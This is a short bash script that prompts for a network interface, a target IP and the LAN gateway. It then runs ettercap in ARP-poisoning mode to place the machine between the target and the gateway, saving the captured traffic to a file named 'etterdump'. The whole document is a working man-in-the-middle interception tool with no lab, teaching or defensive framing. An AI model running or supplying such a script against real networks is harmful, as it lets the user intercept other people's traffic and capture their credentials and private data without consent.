#Arp poison target for use with passive scanning
#! /bin/bash

ifconfig

echo Enter the desired interface to reroute traffic through
read interface
echo Enter the target IP address
read target
echo Enter the default gateway on your LAN
read gateway

echo Captured packets can be found at the pwd under etterdump...

ettercap -M arp:remote -i $interface -T -w etterdump //$gateway/ //$target/
